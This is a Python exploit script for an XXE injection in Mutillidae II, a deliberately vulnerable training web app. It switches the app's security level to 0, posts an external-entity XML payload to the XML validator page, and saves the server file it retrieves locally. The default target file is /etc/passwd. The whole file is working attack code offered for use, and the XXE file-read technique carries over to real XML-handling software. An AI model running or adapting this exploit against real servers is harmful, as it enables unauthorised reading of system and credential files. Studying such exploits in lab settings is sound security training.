import requests
import argparse
import sys
from bs4 import BeautifulSoup

# Chancing security level to 0
def changeSecurityLevel(url, filename, output):
    session = requests.session()
    securityPageGet = session.get(url)
    soup = BeautifulSoup(securityPageGet.text, "lxml")
    # Saving site security level to variable 
    security_level = soup.findAll(attrs={'id':'idSecurityLevelHeading'})
    security_level = security_level[0].text
    # If security level is not 0 it is changed to 0
    if "Security Level: 0 (Hosed)" not in security_level:
        # GET request to /index.php to change security level to 0
        data = {"popUpNotificationCode":"SL0", "page":"/app/home.php"}
        session.get(url + "/index.php", params=data)
    exploit(url, filename, session, output)

# Exploiting XXE injection
def exploit(url, filename, session, output):
    # Payload
    payload ='<?xml version="1.0"?><!DOCTYPE replace [<!ENTITY xxe SYSTEM "file://' + filename + '"> ]><test>&xxe;</test>'
    get_data = {"page":"xml-validator.php"}
    post_data = {"xml":payload, "xml-validator-php-submit-button":"Validate XML", "page":"xml-validator.php"}
    # Sending payload in a request and saving the result
    xxeData = session.post(url + "/index.php", data=post_data, params=get_data)
    # Saving the file data
    try:
        fileData = xxeData.text.split('ReflectedXSSExecutionPoint="1">')[2].split("</div>")[0]
    # Script exits if unable to retrieve the file
    except IndexError:
        print("Unable to retrieve the file")
        sys.exit()
    saveToFile(fileData, output, filename)

# Saving the retrieved data to file
def saveToFile(fileData, output, filename):
    with open (output, "w+") as f:
        f.write(fileData)
    print("File " + filename + " saved into " + output)

# Script starts here
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="""Script exploits XXE injection vulnerability in mutillidae II through xml parameter.
    Script can be used to retrieve files from server.
    Requires Mutillidae II base URL
    Example: python mutillidae-xxe-exploit.py -f /etc/hosts -o hosts -u http://172.17.0.2""")
    parser.add_argument("-f", help="File", default="/etc/passwd")
    parser.add_argument("-u", help="URL")
    parser.add_argument("-o", help="Output", default="output")
    args = parser.parse_args()
    
    # If argument is missing, script stops
    if args.u is None:
        parser.print_help()
        sys.exit()
    if args.f is None:
        parser.print_help()
        sys.exit()
    if args.o is None:
        parser.print_help()
        sys.exit()

    # If arguments are there continue to login 
    changeSecurityLevel(args.u, args.f, args.o)